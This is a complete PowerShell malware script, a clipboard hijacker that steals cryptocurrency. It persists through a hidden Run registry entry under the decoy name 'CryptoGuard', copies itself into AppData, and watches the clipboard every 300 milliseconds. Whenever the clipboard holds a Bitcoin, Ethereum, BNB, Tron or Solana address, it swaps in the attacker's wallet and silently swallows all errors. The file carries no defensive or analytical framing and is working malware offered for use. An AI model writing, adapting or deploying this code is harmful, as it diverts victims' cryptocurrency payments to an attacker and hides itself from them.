# payload.ps1 - Persistent Clipboard Hijacker
# This runs silently in the background and waits for crypto addresses

param(
    [string[]]$wallets
)

# Configuration
$walletMap = @{
    "BTC" = $wallets[0]
    "ETH" = $wallets[1]
    "BNB" = $wallets[2]
    "TRX" = $wallets[3]
    "SOL" = $wallets[4]
}

# Install persistence (runs at every startup)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptPath = "$env:APPDATA\Microsoft\Windows\CryptoGuard.ps1"
Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
Set-ItemProperty -Path $regPath -Name "CryptoGuard" -Value "powershell -WindowStyle Hidden -File `"$scriptPath`""

# Regex patterns for address detection
$patterns = @{
    "BTC" = '^([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})$'
    "ETH" = '^0x[a-fA-F0-9]{40}$'
    "BNB" = '^0x[a-fA-F0-9]{40}$'
    "TRX" = '^T[A-Za-z1-9]{33}$'
    "SOL" = '^[1-9A-HJ-NP-Za-km-z]{32,44}$'
}

# Main monitoring loop (runs every 300ms)
while ($true) {
    Start-Sleep -Milliseconds 300
    try {
        # Get current clipboard content
        $copiedText = Get-Clipboard -Raw -ErrorAction SilentlyContinue
        if (-not $copiedText) { continue }
        
        # Check each currency type
        foreach ($currency in $patterns.Keys) {
            if ($copiedText -match $patterns[$currency]) {
                # Replace with our address
                $copiedText | Set-Clipboard -Value $walletMap[$currency]
                break
            }
        }
    } catch {
        # Silently fail - no errors shown to user
    }
}
